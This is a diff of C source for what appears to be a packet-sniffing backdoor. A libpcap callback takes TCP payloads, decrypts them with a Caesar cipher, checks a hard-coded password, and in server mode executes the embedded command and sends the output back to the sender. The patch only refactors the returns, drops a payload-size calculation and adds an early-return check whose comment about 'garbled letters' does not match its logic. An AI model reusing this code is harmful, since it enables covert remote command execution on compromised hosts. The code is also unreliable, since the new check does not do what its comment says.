@@ -77,10 +77,9 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 
 	int size_ip;
 	int size_tcp;
-	int size_payload;
+	//int size_payload;
 	int mode;
 
-	
 	char password[strlen(PASSWORD) + 1];
 	char decrypted[PKT_SIZE];
 	char * command;
@@ -113,9 +112,6 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 
 	/* define/compute tcp payload (segment) offset */
 	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
-	
-	/* compute tcp payload (segment) size */
-	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
 
 	/* Decrypt the payload */
 	strcpy(decrypted, ConvertCaesar(mDecipher, (char *) payload, MOD, START));
@@ -126,7 +122,10 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		fprintf(stderr, "scanning error\n");
 		return;
 	}
-	//printf("Decrypted Packet: %s\n", decrypted);
+	// If there happens to be some garbled letters in the decrypted, return immediately
+	if(strcmp(decrypted, password) == 0)
+		return;
+
 	command = parse_cmd(decrypted);
 
 	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
@@ -134,19 +133,19 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		fprintf(stderr, "Password Authenticated. Executing command.\n");
 		send_command(command, ip, ntohs(tcp->th_sport));
 		free(command);
-		return;
 	}
 	else if (mode == CLIENT_MODE)
 	{
 		printf("%s\n", command);
 		free(command);
-		return;
 	}
 	else
 	{
 		fprintf(stderr, "Incorrect Password\n");
-		return;
 	}
+	memset(decrypted, 0, sizeof(decrypted));
+	return;
+
 }
 char * parse_cmd(char * data)
 {
